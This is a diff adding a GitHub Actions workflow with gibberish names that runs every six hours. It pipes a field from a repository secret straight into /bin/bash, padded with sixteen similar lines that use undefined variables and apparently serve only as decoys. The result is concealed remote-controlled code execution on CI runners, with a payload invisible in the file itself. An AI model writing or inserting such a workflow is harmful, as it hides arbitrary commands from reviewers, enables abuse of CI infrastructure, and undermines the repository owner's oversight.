@@ -1,0 +1,33 @@
+name: guyindu0918
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '37 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: guyindu0918
+        env:
+          wasyy112: ${{ secrets.wasyy112 }}
+        run: |
+          echo $wasyy112 | jq -r .ip68820 | /bin/bash
+          echo $rdm5 | jq -r .aae0096 | /bin/bash
+          echo $uhtgc470 | jq -r .atrn3 | /bin/bash
+          echo $u7 | jq -r .ddmba510 | /bin/bash
+          echo $ei480 | jq -r .nsz3 | /bin/bash
+          echo $pm269 | jq -r .qkh9 | /bin/bash
+          echo $xh3 | jq -r .fbpag54 | /bin/bash
+          echo $fowf39 | jq -r .oztqc28148 | /bin/bash
+          echo $dyzd26 | jq -r .mvof23 | /bin/bash
+          echo $q7424 | jq -r .ozgyq60 | /bin/bash
+          echo $dnesq09 | jq -r .phs2932 | /bin/bash
+          echo $rga92276 | jq -r .lqtgb0 | /bin/bash
+          echo $oetfp06934 | jq -r .ns5729 | /bin/bash
+          echo $va8939 | jq -r .qmp900 | /bin/bash
+          echo $y52477 | jq -r .e8585 | /bin/bash
+          echo $c09 | jq -r .trld64748 | /bin/bash
+          echo $x94 | jq -r .x771 | /bin/bash
+
